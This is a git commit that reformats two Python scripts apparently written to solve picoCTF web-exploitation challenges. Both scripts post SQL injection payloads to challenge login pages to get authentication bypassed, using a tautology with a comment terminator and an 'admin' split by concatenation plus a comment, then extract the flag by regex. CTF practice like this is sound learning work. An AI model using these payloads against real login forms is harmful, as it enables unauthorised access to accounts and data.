076be6a45186f86d808724cf95eccb63b722132b
gerbsec <albabawaseem@gmail.com>
2021-08-02 13:46:06 -0400

    Syntax cleaning lol

--- Irish-Name-Repo/INP3.py
+++ Irish-Name-Repo/INP3.py
@@ -2,7 +2,7 @@ import requests
 import re
 
 url = "https://jupiter.challenges.picoctf.org/problem/54253/login.php"
-payload = {"password":"'be 1=1-- -","debug":"0"}
+payload = {"password": "'be 1=1-- -", "debug": "0"}
 r = requests.post(url, data=payload)
 flag = re.findall(r'picoCTF{.*?}', r.text)[0]
 print(flag)
--- login/webgauntlet.py
+++ login/webgauntlet.py
@@ -9,9 +9,9 @@ session.post(url1, payload1)
 payload2_3 = {"user": "admin'/*", "pass": "haha"}
 session.post(url1, payload2_3)
 session.post(url1, payload2_3)
-payload4_5 = {"user":"adm'||'in'/*", "pass":"haha"}
-session.post(url1,payload4_5)
+payload4_5 = {"user": "adm'||'in'/*", "pass": "haha"}
 session.post(url1, payload4_5)
-r =session.get(url2)
+session.post(url1, payload4_5)
+r = session.get(url2)
 flag = re.findall(r'picoCTF{.*?}', r.text)[0]
 print(flag)
